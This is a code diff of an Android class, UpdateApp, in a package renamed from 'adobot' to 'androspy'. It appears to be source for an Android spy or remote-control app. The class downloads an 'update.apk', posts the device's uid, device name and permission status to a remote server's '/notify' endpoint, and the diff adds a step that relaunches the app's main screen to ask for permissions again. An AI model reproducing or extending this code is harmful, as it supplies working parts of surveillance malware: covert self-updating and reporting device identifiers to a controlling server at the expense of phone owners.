@@ -1,17 +1,11 @@
-package buddy.ap.com.adobot;
+package buddy.ap.com.androspy;
 
 import android.Manifest;
-import android.app.ProgressDialog;
-import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
-import android.net.ConnectivityManager;
-import android.net.NetworkInfo;
-import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Environment;
 import android.support.v4.content.ContextCompat;
-import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
 
 import java.io.BufferedInputStream;
@@ -30,9 +24,11 @@ public class UpdateApp extends AsyncTask<String, Void, Void> {
     private static final String TAG = "UpdateApp";
     public static final String PKG_FILE = "update.apk";
     private Client client;
+    private CommonParams commonParams;
 
     public void setClient(Client c) {
         this.client = c;
+        this.commonParams = new CommonParams(c);
     }
 
     @Override
@@ -76,11 +72,11 @@ public class UpdateApp extends AsyncTask<String, Void, Void> {
                 Log.e("UpdateAPP", "Update error! " + e.getMessage());
                 HashMap noPermit = new HashMap();
                 noPermit.put("event", "download:error");
-                noPermit.put("uid", client.getUid());
-                noPermit.put("device", client.getDevice());
+                noPermit.put("uid", commonParams.getUid());
+                noPermit.put("device", commonParams.getDevice());
                 noPermit.put("error", "Download failed");
                 Http doneSMS = new Http();
-                doneSMS.setUrl(client.SERVER + "/notify");
+                doneSMS.setUrl(commonParams.getServer() + "/notify");
                 doneSMS.setMethod("POST");
                 doneSMS.setParams(noPermit);
                 doneSMS.execute();
@@ -90,14 +86,19 @@ public class UpdateApp extends AsyncTask<String, Void, Void> {
             Log.e(TAG, "No WRITE_EXTERNAL_STORAGE permission!!!");
             HashMap noPermit = new HashMap();
             noPermit.put("event", "nopermission");
-            noPermit.put("uid", client.getUid());
-            noPermit.put("device", client.getDevice());
+            noPermit.put("uid", commonParams.getUid());
+            noPermit.put("device", commonParams.getDevice());
             noPermit.put("permission", "WRITE_EXTERNAL_STORAGE");
             Http doneSMS = new Http();
-            doneSMS.setUrl(client.SERVER + "/notify");
+            doneSMS.setUrl(commonParams.getServer() + "/notify");
             doneSMS.setMethod("POST");
             doneSMS.setParams(noPermit);
             doneSMS.execute();
+
+            //ask permissions
+            Intent i = new Intent(client, MainActivity.class);
+            i.addFlags(FLAG_ACTIVITY_NEW_TASK);
+            client.startActivity(i);
         }
         return null;
     }
